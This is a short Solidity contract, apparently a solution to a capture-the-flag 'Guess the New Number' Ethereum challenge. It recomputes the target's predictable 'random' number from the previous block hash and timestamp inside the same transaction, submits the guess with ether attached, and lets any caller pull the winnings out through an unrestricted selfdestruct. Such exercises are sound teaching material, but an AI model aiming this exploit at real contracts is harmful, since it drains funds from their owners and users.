pragma solidity ^0.4.21;

contract myAnswer {


    function myAns() public payable{

        GuessTheNewNumberChallenge GTNN = GuessTheNewNumberChallenge(0xb29CBf02F433Ea2dAB2Fd0371Eb2526B3D6bDFBd);

        uint8 ans = uint8(keccak256(block.blockhash(block.number - 1), now));
        GTNN.guess.value(msg.value)(ans);

    }

    function () public payable{

    }

    function getEth() public payable{

        selfdestruct(msg.sender);

    }

}
